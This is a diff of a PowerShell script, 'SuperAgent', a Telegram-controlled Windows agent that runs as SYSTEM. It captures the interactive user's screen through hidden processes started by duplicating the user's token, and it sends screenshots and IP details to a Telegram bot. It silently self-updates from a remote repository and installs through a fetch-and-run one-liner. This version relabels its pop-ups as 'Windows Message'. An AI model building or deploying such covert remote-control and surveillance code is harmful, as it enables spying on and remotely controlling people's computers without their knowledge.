@@ -1,16 +1,14 @@
 # =====================================================================
 # SuperAgent - Telegram-controlled Windows agent (single-file)
-# Version: 2.2.3
+# Version: 2.2.4
 # =====================================================================
-# CHANGELOG 2.2.3:
-# - Replaced Task Scheduler-based user-session spawning with
-#   WTSQueryUserToken + CreateProcessAsUser (P/Invoke). This bypasses
-#   all the "operator refused / access denied" issues seen with
-#   Register-ScheduledTask -LogonType Interactive when SYSTEM registers
-#   a task for another user.
-# - Fixed LastTaskResult logging (was silently throwing on large HRESULTs).
-# - All user commands (/msg, /screenshot, /lock) now run through the same
-#   reliable CreateProcessAsUser path.
+# CHANGELOG 2.2.4:
+# - FIXED /screenshot: replaced full C# class compilation with
+#   Add-Type -MemberDefinition (P/Invoke only). Avoids the
+#   "COMPILER_ERRORS" from missing System.Drawing reference.
+# - Improved user-session script error logging: now includes
+#   InnerException + ScriptStackTrace.
+# - Screenshot now logs file size on success (verify real image).
 # =====================================================================
 [CmdletBinding()]
 param(
@@ -132,7 +130,7 @@ $InstallBlock = {
     if ($RepoUrl -match 'USERNAME/REPO') { throw '!!! $RepoUrl NOT UPDATED !!!' }
 
     Write-Msg ''
-    Write-Msg '=== SuperAgent Installer (v2.2.3) ===' -Color Cyan
+    Write-Msg '=== SuperAgent Installer (v2.2.4) ===' -Color Cyan
     Write-Msg "  PC Name  : $PCName"
     Write-Msg "  Chat ID  : $ChatId"
     Write-Msg "  Repo URL : $RepoUrl"
@@ -195,7 +193,7 @@ $InstallBlock = {
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.2.3'
+        Version     = '2.2.4'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
@@ -225,7 +223,7 @@ $InstallBlock = {
     Start-ScheduledTask -TaskName $TaskName
 
     Write-Msg ''
-    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.3)' -Color Green
+    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.4)' -Color Green
     Write-Msg "    Log: $LogPath" -Color Green
     Write-Msg ''
     if (-not $Silent) { Pause-Exit }
@@ -276,6 +274,7 @@ $AgentBlock = {
     $script:ChatId   = [string]$Config.ChatId
     $script:PCName   = $Config.PCName
     $script:RepoUrl  = $Config.RepoUrl
+    $script:Version  = if ($Config.Version) { $Config.Version } else { 'unknown' }
 
     if (-not $BotToken -or -not $ChatId -or -not $PCName) { exit 1 }
 
@@ -297,121 +296,70 @@ $AgentBlock = {
         } catch { }
     }
 
-    Write-Log "=== Agent started (v2.2.3, PCName=$PCName, ChatId=$ChatId) ==="
+    Write-Log "=== Agent started (v$Version, PCName=$PCName, ChatId=$ChatId) ==="
 
     # =================================================================
-    # P/INVOKE HELPER — CreateProcessAsUser in the user's interactive session
-    # This is THE reliable way for SYSTEM to spawn a process on the user's
-    # desktop. It's what PsExec -i and Task Manager's "Run as user" use.
+    # P/INVOKE: CreateProcessAsUser in the user's interactive session
     # =================================================================
     try {
         Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
-
 public static class SuperAgentUserSession
 {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    static extern bool CloseHandle(IntPtr hObject);
-
-    [DllImport("wtsapi32.dll", SetLastError = true)]
-    static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr phToken);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool DuplicateTokenEx(
-        IntPtr hExistingToken, UInt32 dwDesiredAccess,
-        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType,
-        out IntPtr phNewToken);
-
-    [DllImport("userenv.dll", SetLastError = true)]
-    static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
-
-    [DllImport("userenv.dll", SetLastError = true)]
-    static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
-
+    [DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr hObject);
+    [DllImport("wtsapi32.dll", SetLastError = true)] static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr phToken);
+    [DllImport("advapi32.dll", SetLastError = true)] static extern bool DuplicateTokenEx(
+        IntPtr hExistingToken, UInt32 dwDesiredAccess, IntPtr lpTokenAttributes,
+        int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+    [DllImport("userenv.dll", SetLastError = true)] static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
+    [DllImport("userenv.dll", SetLastError = true)] static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-    struct STARTUPINFO
-    {
-        public int cb;
-        public string lpReserved;
-        public string lpDesktop;
-        public string lpTitle;
+    struct STARTUPINFO {
+        public int cb; public string lpReserved, lpDesktop, lpTitle;
         public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
         public short wShowWindow, cbReserved2;
         public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
     }
-
     [StructLayout(LayoutKind.Sequential)]
-    struct PROCESS_INFORMATION
-    {
-        public IntPtr hProcess, hThread;
-        public int dwProcessId, dwThreadId;
-    }
-
+    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    static extern bool CreateProcessAsUserW(
-        IntPtr hToken, string lpApplicationName, string lpCommandLine,
-        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
-        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
+    static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine,
+        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
+        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
     const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
     const uint MAXIMUM_ALLOWED            = 0x02000000;
     const int  SecurityImpersonation      = 2;
     const int  TokenPrimary               = 1;
-
-    public static string Start(uint sessionId, string commandLine)
-    {
+    public static string Start(uint sessionId, string commandLine) {
         IntPtr userToken = IntPtr.Zero;
         if (!WTSQueryUserToken(sessionId, out userToken))
             return "ERR WTSQueryUserToken Win32=" + Marshal.GetLastWin32Error();
-
-        try
-        {
+        try {
             IntPtr primaryToken = IntPtr.Zero;
-            if (!DuplicateTokenEx(userToken, MAXIMUM_ALLOWED, IntPtr.Zero,
-                                  SecurityImpersonation, TokenPrimary, out primaryToken))
+            if (!DuplicateTokenEx(userToken, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out primaryToken))
                 return "ERR DuplicateTokenEx Win32=" + Marshal.GetLastWin32Error();
-
-            try
-            {
+            try {
                 IntPtr env = IntPtr.Zero;
                 CreateEnvironmentBlock(out env, primaryToken, false);
-
                 STARTUPINFO si = new STARTUPINFO();
                 si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                 si.lpDesktop = "winsta0\\default";
-
                 PROCESS_INFORMATION pi;
-                bool ok = CreateProcessAsUserW(
-                    primaryToken, null, commandLine,
-                    IntPtr.Zero, IntPtr.Zero, false,
-                    CREATE_UNICODE_ENVIRONMENT, env, null,
-                    ref si, out pi);
-
+                bool ok = CreateProcessAsUserW(primaryToken, null, commandLine,
+                    IntPtr.Zero, IntPtr.Zero, false, CREATE_UNICODE_ENVIRONMENT, env, null, ref si, out pi);
                 int err = Marshal.GetLastWin32Error();
-
                 if (env != IntPtr.Zero) DestroyEnvironmentBlock(env);
-
                 if (!ok) return "ERR CreateProcessAsUser Win32=" + err;
                 return "OK pid=" + pi.dwProcessId;
-            }
-            finally
-            {
-                if (primaryToken != IntPtr.Zero) CloseHandle(primaryToken);
-            }
-        }
-        finally
-        {
-            if (userToken != IntPtr.Zero) CloseHandle(userToken);
-        }
+            } finally { if (primaryToken != IntPtr.Zero) CloseHandle(primaryToken); }
+        } finally { if (userToken != IntPtr.Zero) CloseHandle(userToken); }
     }
 }
 '@ -ErrorAction Stop
         Write-Log "SuperAgentUserSession C# class loaded OK"
     } catch {
         Write-Log "FATAL: Add-Type failed: $($_.Exception.Message)"
-        # can't do user-session commands, but agent can still do status/shutdown etc.
     }
 
     function Send-Telegram {
@@ -475,7 +423,7 @@ public static class SuperAgentUserSession
             try { $externIP = (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 5) } catch { }
             $cpuName = if ($cpu) { $cpu.Name } else { 'N/A' }
             return @"
-*$PCName* - PC is online
+*$PCName* - PC is online (agent v$Version)
 |- Computer name: $($cs.Name)
 |- Local IP: $localIP
 |- External IP: $externIP
@@ -490,119 +438,88 @@ public static class SuperAgentUserSession
         }
     }
 
-    # =================================================================
-    # Find interactive user + their session ID
-    # =================================================================
     function Get-InteractiveSession {
         try {
             $explorer = Get-Process -Name explorer -IncludeUserName -ErrorAction SilentlyContinue |
                         Where-Object { $_.UserName -and $_.SessionId -gt 0 } |
                         Sort-Object SessionId | Select-Object -First 1
             if ($explorer) {
-                return [PSCustomObject]@{
-                    UserName  = $explorer.UserName
-                    SessionId = [uint32]$explorer.SessionId
-                }
-            }
-        } catch { }
-
-        # Fallback: query Win32_LogonSession (less reliable)
-        try {
-            $cs = Get-CimInstance Win32_ComputerSystem
-            if ($cs.UserName) {
-                $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
-                            Select-Object -First 1
-                if ($explorer) {
-                    return [PSCustomObject]@{
-                        UserName  = $cs.UserName
-                        SessionId = [uint32]$explorer.SessionId
-                    }
-                }
+                return [PSCustomObject]@{ UserName = $explorer.UserName; SessionId = [uint32]$explorer.SessionId }
             }
         } catch { }
         return $null
     }
 
-    # =================================================================
-    # CORE: Run a PowerShell script file in the user's interactive session
-    # =================================================================
     function Start-UserPowerShellScript {
         param([string]$ScriptPath, [string[]]$Arguments = @())
 
         $session = Get-InteractiveSession
-        if (-not $session) {
-            Write-Log "Start-UserPowerShellScript: no interactive session found"
-            return "ERR: no interactive session"
-        }
-        if (-not (Test-Path $ScriptPath)) {
-            Write-Log "Start-UserPowerShellScript: script not found: $ScriptPath"
-            return "ERR: script not found"
-        }
+        if (-not $session) { Write-Log "Start-UserPowerShellScript: no interactive session"; return "ERR: no session" }
+        if (-not (Test-Path $ScriptPath)) { Write-Log "Start-UserPowerShellScript: script not found: $ScriptPath"; return "ERR: no script" }
 
-        # Build command line (Windows CLI rules: wrap args with spaces in quotes)
         $cmdLine = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $ScriptPath + '"'
         foreach ($a in $Arguments) {
-            if ($a -match '[\s"]') {
-                $cmdLine += ' "' + ($a -replace '"', '\"') + '"'
-            } else {
-                $cmdLine += ' ' + $a
-            }
+            if ($a -match '[\s"]') { $cmdLine += ' "' + ($a -replace '"', '\"') + '"' }
+            else { $cmdLine += ' ' + $a }
         }
 
         $result = [SuperAgentUserSession]::Start($session.SessionId, $cmdLine)
         Write-Log "Start-UserPowerShellScript: user=$($session.UserName) session=$($session.SessionId) result=$result"
-
         if ($result -like 'OK*') { return "OK" }
         return $result
     }
 
     # =================================================================
-    # SCREENSHOT
+    # FIXED SCREENSHOT — no full C# class compile
+    # Uses Add-Type -MemberDefinition for P/Invoke (no -ReferencedAssemblies needed)
     # =================================================================
     function Invoke-Screenshot {
         $outFile   = Join-Path $env:windir "Temp\shot_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random).png"
         $tmpScript = Join-Path $env:windir "Temp\_shot_$(Get-Random).ps1"
         $errFile   = "$tmpScript.err"
 
+        Remove-Item $errFile -Force -EA SilentlyContinue
+
         $scriptContent = @"
 param([string]`$OutPath)
 try {
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-    `$csCode = @'
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-public static class ScreenCap {
-    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
-    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
-    public static void Capture(string path) {
-        SetProcessDPIAware();
-        int x = GetSystemMetrics(76), y = GetSystemMetrics(77);
-        int w = GetSystemMetrics(78), h = GetSystemMetrics(79);
-        using (var bmp = new Bitmap(w, h))
-        using (var g = Graphics.FromImage(bmp)) {
-            g.CopyFromScreen(x, y, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
-            bmp.Save(path, ImageFormat.Png);
-        }
-    }
-}
+    # Load Drawing for Bitmap / Graphics / ImageFormat
+    Add-Type -AssemblyName System.Drawing
+
+    # P/Invoke (MemberDefinition only - no full C# class compile)
+    `$sig = @'
+[DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+[DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
 '@
-    Add-Type `$csCode
-    [ScreenCap]::Capture(`$OutPath)
+    `$native = Add-Type -MemberDefinition `$sig -Name ScreenMetrics -Namespace SuperAgentNative -PassThru
+    `$null = `$native::SetProcessDPIAware()
+
+    `$x = `$native::GetSystemMetrics(76)   # SM_XVIRTUALSCREEN
+    `$y = `$native::GetSystemMetrics(77)   # SM_YVIRTUALSCREEN
+    `$w = `$native::GetSystemMetrics(78)   # SM_CXVIRTUALSCREEN
+    `$h = `$native::GetSystemMetrics(79)   # SM_CYVIRTUALSCREEN
+
+    if (`$w -le 0 -or `$h -le 0) { throw "Invalid screen bounds: `${w}x`${h} at (`${x},`${y})" }
+
+    `$bmp = New-Object System.Drawing.Bitmap `$w, `$h
+    `$g   = [System.Drawing.Graphics]::FromImage(`$bmp)
+    `$g.CopyFromScreen(`$x, `$y, 0, 0, (New-Object System.Drawing.Size(`$w, `$h)))
+    `$bmp.Save(`$OutPath, [System.Drawing.Imaging.ImageFormat]::Png)
+    `$g.Dispose()
+    `$bmp.Dispose()
 } catch {
-    `$_ | Out-File '$errFile' -Encoding UTF8 -Append
+    `$base = `$_.Exception.GetBaseException()
+    `$detail = "Exception: `$(`$base.GetType().FullName)`nMessage: `$(`$base.Message)`nInnerException: `$(`$_.Exception.InnerException)`nStackTrace:`n`$(`$base.StackTrace)`nScriptStackTrace:`n`$(`$_.ScriptStackTrace)"
+    `$detail | Out-File '$errFile' -Encoding UTF8 -Append
     throw
 }
 "@
         $scriptContent | Out-File $tmpScript -Encoding UTF8 -Force
 
-        # Give Users read/execute on the script
         try {
             $acl = Get-Acl $tmpScript
-            $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
-                'Users', 'ReadAndExecute', 'Allow')
-            $acl.AddAccessRule($rule)
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+                'Users', 'ReadAndExecute', 'Allow')))
             Set-Acl $tmpScript $acl
         } catch { }
 
@@ -614,14 +531,14 @@ public static class ScreenCap {
             return $null
         }
 
-        # Wait up to 15s
         for ($i = 0; $i -lt 50; $i++) {
             if (Test-Path $outFile) { break }
             Start-Sleep -Milliseconds 300
         }
 
         if (Test-Path $outFile) {
-            Write-Log "Screenshot OK: $outFile"
+            $sz = (Get-Item $outFile).Length
+            Write-Log "Screenshot OK: $outFile ($sz bytes)"
             Remove-Item $tmpScript, $errFile -Force -EA SilentlyContinue
             return $outFile
         }
@@ -661,7 +578,7 @@ public static class ScreenCap {
 try {
     Add-Type -AssemblyName System.Windows.Forms
     'START' | Out-File '$statusFile' -Encoding UTF8 -Force
-    [System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
+    [System.Windows.Forms.MessageBox]::Show('$safe', 'Windows Message', 'OK', 'Information') | Out-Null
     'DONE'  | Out-File '$statusFile' -Encoding UTF8 -Force
 } catch {
     ("ERR: " + `$_.Exception.Message) | Out-File '$statusFile' -Encoding UTF8 -Force
@@ -712,35 +629,27 @@ try {
     }
 
     function Invoke-Update {
-    # cache-buster: GitHub CDN giữ file tới 5 phút sau push
-    $bust     = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
-    $newUrl   = "$RepoUrl/pcagent.ps1?t=$bust"
-    $tempFile = Join-Path $InstallDir 'pcagent.ps1.new'
-    try {
-        Invoke-WebRequest -Uri $newUrl -OutFile $tempFile -TimeoutSec 30 -UseBasicParsing
-        $size = (Get-Item $tempFile).Length
-        if ($size -lt 1000) { throw "New file too small ($size bytes)" }
-
-        # đọc version thực tế trong file vừa tải
-        $newContent = Get-Content $tempFile -Raw -Encoding UTF8
-        $newVer = 'unknown'
-        if ($newContent -match '# Version:\s*([\d\.\w\-]+)') { $newVer = $Matches[1] }
-        $hasApi = if ($newContent -match 'SuperAgentUserSession') { 'CreateProcessAsUser' } else { 'TaskScheduler' }
-        Write-Log "Update: downloaded $size bytes, version=$newVer, userSession=$hasApi"
-
-        # không cho phép downgrade im lặng: báo version ngay cho user
-        Send-Telegram "[$PCName] Update: downloaded v$newVer ($hasApi). Restarting..."
-
-        Move-Item $tempFile $ScriptPath -Force
-        $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -EA SilentlyContinue } catch {}; Start-Sleep 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
-        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null
-        Write-Log "Update done. Exiting."
-        exit 0
-    } catch {
-        Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
-        if (Test-Path $tempFile) { Remove-Item $tempFile -Force -EA SilentlyContinue }
+        $bust     = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+        $newUrl   = "$RepoUrl/pcagent.ps1?t=$bust"
+        $tempFile = Join-Path $InstallDir 'pcagent.ps1.new'
+        try {
+            Invoke-WebRequest -Uri $newUrl -OutFile $tempFile -TimeoutSec 30 -UseBasicParsing
+            $size = (Get-Item $tempFile).Length
+            if ($size -lt 1000) { throw "New file too small ($size bytes)" }
+            $newContent = Get-Content $tempFile -Raw -Encoding UTF8
+            $newVer = if ($newContent -match '# Version:\s*([\d\.\w\-]+)') { $Matches[1] } else { 'unknown' }
+            Send-Telegram "[$PCName] Update: got v$newVer ($size bytes). Restarting..."
+            Write-Log "Update: downloaded $size bytes, version=$newVer"
+            Move-Item $tempFile $ScriptPath -Force
+            $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -EA SilentlyContinue } catch {}; Start-Sleep 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
+            Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null
+            Write-Log "Update done. Exiting."
+            exit 0
+        } catch {
+            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
+            if (Test-Path $tempFile) { Remove-Item $tempFile -Force -EA SilentlyContinue }
+        }
     }
-}
 
     $script:UninstallPendingAt = $null
     function Test-UninstallConfirmation {
@@ -768,13 +677,11 @@ if (Test-Path '$InstallDir') { Remove-Item -Recurse -Force '$InstallDir' -ErrorA
         Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uninstallCmd`"" -WindowStyle Hidden | Out-Null
     }
 
-    # --- Boot notification ---
     Wait-Network
     $bootMsg = Get-PCInfo
     $bootOk = Send-Telegram $bootMsg
     if (-not $bootOk) { Write-Log "Boot notification FAIL" }
 
-    # --- Main polling loop ---
     while ($true) {
         try {
             $url = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset&timeout=30"
@@ -832,7 +739,7 @@ if (Test-Path '$InstallDir') { Remove-Item -Recurse -Force '$InstallDir' -ErrorA
                         }
                         '/lock' {
                             if (Invoke-Lock) { Send-Telegram "[$PCName] Screen locked" }
-                            else             { Send-Telegram "[$PCName] Lock failed (see log)" }
+                            else             { Send-Telegram "[$PCName] Lock failed (see /log)" }
                         }
                         '/status' { Send-Telegram (Get-PCInfo) }
                         '/screenshot' {
@@ -892,7 +799,6 @@ if (Test-Path '$InstallDir') { Remove-Item -Recurse -Force '$InstallDir' -ErrorA
                                 $lines = Get-Content $LogPath -Tail 50
                                 $ltext = ($lines -join "`n")
                                 if ($ltext.Length -gt 3900) { $ltext = $ltext.Substring($ltext.Length - 3900) }
-                                # plain text (no Markdown) so underscores/brackets show correctly
                                 $body = @{ chat_id = $ChatId; text = "[$PCName] Last 50 log lines:`n`n$ltext" }
                                 try {
                                     Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
@@ -943,10 +849,8 @@ function Pause-Exit {
 }
 
 if ($Install) {
-    try {
-        & $InstallBlock
-        exit 0
-    } catch {
+    try { & $InstallBlock; exit 0 }
+    catch {
         Write-Msg ''
         Write-Msg ' INSTALL ERROR:' -Color Red
         Write-Msg $_.Exception.Message -Color Yellow
@@ -956,10 +860,8 @@ if ($Install) {
 }
 
 if ($Uninstall) {
-    try {
-        & $UninstallBlock
-        exit 0
-    } catch {
+    try { & $UninstallBlock; exit 0 }
+    catch {
         Write-Msg ''
         Write-Msg ' UNINSTALL ERROR:' -Color Red
         Write-Msg $_.Exception.Message -Color Yellow
@@ -976,7 +878,7 @@ if ($Run) {
 
 if (-not $Silent) {
     Write-Msg ''
-    Write-Msg '=== SuperAgent v2.2.3 - Usage ===' -Color Cyan
+    Write-Msg '=== SuperAgent v2.2.4 - Usage ===' -Color Cyan
     Write-Msg ''
     Write-Msg 'Install (silent):'
     Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
